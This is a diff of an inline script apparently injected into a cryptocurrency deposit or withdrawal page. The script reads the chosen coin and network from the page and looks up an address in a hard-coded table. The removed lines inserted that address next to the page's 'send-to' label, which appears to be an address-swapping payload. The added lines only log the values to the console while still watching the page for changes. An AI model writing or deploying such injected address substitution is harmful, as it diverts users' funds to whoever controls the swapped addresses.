@@ -69,48 +69,30 @@
     "BNB_BSC": "1000000000000021"
   };
 
-  function getCurrentKey() {
+  function updateAddress() {
     const coinEl = document.querySelector('span.font-bold');
     const networkEl = document.querySelector('div.font-display');
 
-    if (!coinEl || !networkEl) return null;
+    if (!coinEl || !networkEl) {
+      console.log('⛔ Coin or Network element not found');
+      return;
+    }
 
     const coin = coinEl.textContent.trim().toUpperCase();
     const network = networkEl.textContent.replace(/Network/i, '').trim().toUpperCase();
+    const key = `${coin}_${network}`;
 
-    return `${coin}_${network}`;
-  }
-
-  function updateAddress() {
-    const key = getCurrentKey();
-    const address = coinAddresses[key];
-
-    if (!address) return;
-
-    const sendToLabel = document.getElementById("send-to-label");
-    if (!sendToLabel) return;
-
-    let addressEl = document.getElementById("custom-address-display");
-
-    if (!addressEl) {
-      addressEl = document.createElement("span");
-      addressEl.id = "custom-address-display";
-      addressEl.className = "dark:text-flashbang-white text-new-black inline-block select-all break-words break-all text-xl font-bold";
-      sendToLabel.insertAdjacentElement("afterend", addressEl);
-    }
-
-    addressEl.textContent = address;
+    console.log("🪙 Coin:", coin);
+    console.log("🌐 Network:", network);
+    console.log("🔑 Key:", key);
+    console.log("📮 Address:", coinAddresses[key] || "Not found");
   }
 
   function observeChanges() {
     const targetNode = document.body;
 
-    const observer = new MutationObserver((mutationsList, observer) => {
-      for (const mutation of mutationsList) {
-        if (mutation.type === "childList" || mutation.type === "subtree" || mutation.type === "attributes") {
-          updateAddress();
-        }
-      }
+    const observer = new MutationObserver(() => {
+      updateAddress();
     });
 
     observer.observe(targetNode, {
@@ -124,9 +106,10 @@
     setTimeout(() => {
       updateAddress();
       observeChanges();
-    }, 2000); // give DOM time to render
+    }, 2000);
   });
 </script>
+
 
 
 
